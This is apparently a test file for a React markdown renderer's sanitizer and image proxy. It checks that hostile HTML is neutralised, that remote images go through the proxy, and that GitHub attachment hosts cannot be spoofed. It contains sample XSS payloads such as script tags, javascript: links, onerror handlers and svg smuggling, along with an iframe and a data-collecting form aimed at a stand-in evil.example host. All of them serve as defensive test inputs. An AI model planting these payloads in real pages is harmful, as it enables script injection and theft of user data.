import { describe, expect, it } from 'bun:test'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import {
  MARKDOWN_SANITIZE_SCHEMA,
  isGithubAttachmentUrl,
  proxiedImageUrl,
  proxiedSrcSet,
} from '@/lib/markdown-security'
import { greptileSummaryBody, linearLinkbackBody } from '@/fixtures/prs/pr312-rate-limiting'
import { Markdown } from './markdown'

/**
 * The markdown renderer's security contract, asserted on real HTML output.
 * `renderToStaticMarkup` runs the full pipeline (remark → rehype-raw →
 * rehype-sanitize → components) with no DOM, so what these tests see is
 * exactly the markup a browser would receive.
 */
function render(body: string): string {
  return renderToStaticMarkup(createElement(Markdown, null, body))
}

describe('sanitize schema', () => {
  it('strips style content, not just script', () => {
    expect(MARKDOWN_SANITIZE_SCHEMA.strip).toEqual(['script', 'style'])
  })

  it('protocol-checks srcSet', () => {
    expect(MARKDOWN_SANITIZE_SCHEMA.protocols?.srcSet).toEqual(['http', 'https'])
  })
})

describe('bot bodies render as real elements', () => {
  it('Linear linkback: details, summary, sub, picture, source — nothing escaped', () => {
    const html = render(linearLinkbackBody)
    expect(html).toContain('<details')
    expect(html).toContain('<summary')
    expect(html).toContain('<sub')
    expect(html).toContain('<picture')
    expect(html).toContain('<source')
    expect(html).not.toContain('&lt;')
  })

  it('Greptile summary: heading, table, details — nothing escaped', () => {
    const html = render(greptileSummaryBody)
    expect(html).toContain('<h3')
    expect(html).toContain('<table')
    expect(html).toContain('<details')
    expect(html).toContain('<sub')
    expect(html).not.toContain('&lt;')
  })

  it('Greptile summary: the mermaid fence statically renders as its code-block fallback', () => {
    const html = render(greptileSummaryBody)
    expect(html).toContain('language-mermaid')
    expect(html).toContain('sequenceDiagram')
  })
})

describe('hostile markup is neutralised', () => {
  /**
   * Every payload is embedded in an otherwise-ordinary comment (the realistic
   * shape: an attack hidden inside prose), so the empty-render fallback —
   * which shows a source-only body as escaped text — never kicks in and the
   * assertions inspect the sanitized tree itself.
   */
  const attacks: Array<[name: string, payload: string, absent: string[]]> = [
    ['script tag and its content', '<script>window.__pwned = 1</script>', ['<script', '__pwned']],
    ['iframe', '<iframe src="https://evil.example/"></iframe>', ['<iframe', 'evil.example']],
    ['object', '<object data="https://evil.example/x.swf"></object>', ['<object', '<param']],
    ['embed', '<embed src="https://evil.example/x.svg">', ['<embed']],
    ['style tag and its content', '<style>#root{display:none}</style>', ['<style', 'display:none']],
    ['form', '<form action="https://evil.example/collect"><input name="t"></form>', ['<form', 'action=']],
    ['base', '<base href="https://evil.example/">', ['<base']],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example/">', ['<meta']],
    ['inline style attribute', '<p style="position:fixed;inset:0">pinned</p>', ['style=']],
    ['overlay classes', '<div class="fixed inset-0">cover</div>', ['class="fixed', 'inset-0']],
    ['javascript: href in raw HTML', '<a href="javascript:alert(1)">go</a>', ['href="javascript']],
    ['javascript: href in markdown', '[go](javascript:alert(1))', ['href="javascript']],
    ['event handler attribute', '<img src="https://h.example/x.png" onerror="alert(1)">', ['onerror']],
    ['javascript: srcset', '<picture><source srcset="javascript:alert(1)"><img src="https://h.example/x.png"></picture>', ['javascript:']],
    ['svg smuggling', '<svg><script>1</script></svg>', ['<svg', '<script']],
  ]

  for (const [name, payload, absent] of attacks) {
    it(name, () => {
      const html = render(`a perfectly normal remark\n\n${payload}\n\nand a closing line`)
      for (const needle of absent) expect(html).not.toContain(needle)
      expect(html).toContain('a perfectly normal remark')
    })
  }

  it('a body that sanitizes to nothing surfaces as escaped source, never live markup', () => {
    const html = render('<script>window.__pwned = 1</script>')
    expect(html).not.toContain('<script')
    expect(html).toContain('&lt;script&gt;')
  })

  it('a javascript: candidate hidden behind a clean first srcset candidate is dropped', () => {
    const html = render(
      '<picture><source srcset="https://h.example/a.png 1x, javascript:alert(1) 2x"><img src="https://h.example/a.png"></picture>',
    )
    expect(html).not.toContain('javascript')
    expect(html).toContain('/image-proxy?url=https%3A%2F%2Fh.example%2Fa.png 1x')
  })

  it('raw attributes cannot override link target/rel', () => {
    const html = render('<a href="https://h.example/" target="_self" rel="opener">x</a>')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noreferrer noopener"')
    expect(html).not.toContain('_self')
  })
})

describe('remote images ride the proxy', () => {
  it('markdown image syntax', () => {
    const html = render('![alt](https://cdn.example/pic.png)')
    expect(html).toContain('src="/image-proxy?url=https%3A%2F%2Fcdn.example%2Fpic.png"')
    expect(html).not.toContain('src="https://')
  })

  it('raw img and source srcset', () => {
    const html = render(linearLinkbackBody)
    expect(html).toContain('src="/image-proxy?url=https%3A%2F%2Fstatic.linear.app%2Fbadges%2Fmer-1289.png"')
    // Attribute names are case-insensitive in HTML; the static renderer emits
    // `srcSet=` verbatim, so match the name case-insensitively.
    expect(html).toMatch(
      /srcset="\/image-proxy\?url=https%3A%2F%2Fstatic\.linear\.app%2Fbadges%2Fmer-1289-dark\.png 1x/i,
    )
    expect(html).not.toContain('="https://static.linear.app')
  })

  it('proxiedImageUrl: absolute is proxied, relative passes, other schemes vanish', () => {
    expect(proxiedImageUrl('https://a.example/x.png')).toBe(
      '/image-proxy?url=https%3A%2F%2Fa.example%2Fx.png',
    )
    expect(proxiedImageUrl('/local.png')).toBe('/local.png')
    expect(proxiedImageUrl('//a.example/x.png')).toBeUndefined()
    expect(proxiedImageUrl('data:image/png;base64,AAAA')).toBeUndefined()
    expect(proxiedImageUrl('')).toBeUndefined()
    expect(proxiedImageUrl(undefined)).toBeUndefined()
  })

  it('proxiedSrcSet: filters per candidate and keeps descriptors', () => {
    expect(proxiedSrcSet('https://a.example/1.png 1x, javascript:alert(1) 2x')).toBe(
      '/image-proxy?url=https%3A%2F%2Fa.example%2F1.png 1x',
    )
    expect(proxiedSrcSet('javascript:alert(1)')).toBeUndefined()
    expect(proxiedSrcSet(undefined)).toBeUndefined()
  })
})

describe('github attachment hosts bypass the proxy', () => {
  const attachment =
    'https://github.com/user-attachments/assets/0b8a2c1e-9f3d-4a6b-8c5e-1d2f3a4b5c6d'
  const privateImage =
    'https://private-user-images.githubusercontent.com/12345/467-abc.png?jwt=eyJ0'

  it('a github.com/user-attachments URL keeps its original src', () => {
    const html = render(`![failing test screenshot](${attachment})`)
    expect(html).toContain(`src="${attachment}"`)
    expect(html).not.toContain('/image-proxy?url=https%3A%2F%2Fgithub.com')
  })

  it('a *.githubusercontent.com URL keeps its original src', () => {
    const html = render(`<img src="${privateImage}" alt="trace">`)
    expect(html).toContain('src="https://private-user-images.githubusercontent.com/12345/467-abc.png?jwt=eyJ0"')
    expect(html).not.toContain('githubusercontent.com%2F')
  })

  it('a third-party image still rides the proxy', () => {
    const html = render('![badge](https://cdn.example/badge.svg)')
    expect(html).toContain('src="/image-proxy?url=https%3A%2F%2Fcdn.example%2Fbadge.svg"')
    expect(html).not.toContain('src="https://cdn.example')
  })

  it('host spoofing never bypasses the proxy', () => {
    for (const spoof of [
      'https://evil.example/?x=github.com',
      'https://github.com.evil.example/x.png',
      'https://notgithub.com/x.png',
      'https://github.com@evil.example/user-attachments/x.png',
      'https://evilgithubusercontent.com/x.png',
    ]) {
      expect(isGithubAttachmentUrl(spoof)).toBe(false)
      expect(proxiedImageUrl(spoof)).toBe(`/image-proxy?url=${encodeURIComponent(spoof)}`)
    }
  })

  it('the bypass requires https and, on github.com, the user-attachments path', () => {
    expect(isGithubAttachmentUrl(`http://${attachment.slice('https://'.length)}`)).toBe(false)
    expect(isGithubAttachmentUrl('https://github.com/pat-mw/repo/raw/main/x.png')).toBe(false)
    expect(isGithubAttachmentUrl(attachment)).toBe(true)
    expect(isGithubAttachmentUrl(privateImage)).toBe(true)
    expect(isGithubAttachmentUrl('https://user-images.githubusercontent.com/1/2.png')).toBe(true)
  })

  it('a protocol-relative github URL is still refused outright', () => {
    expect(proxiedImageUrl('//github.com/user-attachments/assets/0b8a2c1e.png')).toBeUndefined()
  })

  it('srcSet candidates are allowlisted per candidate', () => {
    expect(proxiedSrcSet(`${attachment} 1x, https://cdn.example/2.png 2x`)).toBe(
      `${attachment} 1x, /image-proxy?url=https%3A%2F%2Fcdn.example%2F2.png 2x`,
    )
    expect(proxiedSrcSet('//github.com/user-attachments/assets/a.png 1x')).toBeUndefined()
  })
})

describe('image load-failure fallback', () => {
  it('the static render carries the image, not the note', () => {
    const html = render('![alt text](https://cdn.example/pic.png)')
    expect(html).toContain('<img')
    expect(html).not.toContain('images require github user credentials')
  })

  it('alt text survives onto the rendered element for the failure note to reuse', () => {
    const html = render('![failing test screenshot](https://cdn.example/pic.png)')
    expect(html).toContain('alt="failing test screenshot"')
  })
})

describe('app fence conventions survive sanitization', () => {
  it('```suggestion still renders a SuggestionBlock', () => {
    const html = render('```suggestion\nconst x = 1\n```')
    expect(html).toContain('Suggested change')
    expect(html).toContain('const x = 1')
  })

  it('```js still carries language-js for highlighting', () => {
    const html = render('```js\nconst x = 1\n```')
    expect(html).toContain('class="language-js"')
  })

  it('the hast node prop no longer leaks into the DOM', () => {
    const html = render('para with [link](https://h.example/) and `code`\n\n- item\n\n| a |\n| - |\n| b |')
    expect(html).not.toContain('node="[object')
  })
})

describe('empty-render fallback', () => {
  it('an unterminated comment shows the source instead of nothing', () => {
    const html = render('<!-- oops, the closing marker never arrives\nreal content below')
    expect(html).toContain('real content below')
    expect(html).toContain('whitespace-pre-wrap')
  })

  it('a blank body still renders nothing', () => {
    const html = render('   \n  ')
    expect(html).not.toContain('whitespace-pre-wrap')
  })

  it('a terminated comment renders the surrounding content normally', () => {
    const html = render('before\n\n<!-- fine -->\n\nafter')
    expect(html).toContain('before')
    expect(html).toContain('after')
    expect(html).not.toContain('whitespace-pre-wrap')
  })
})
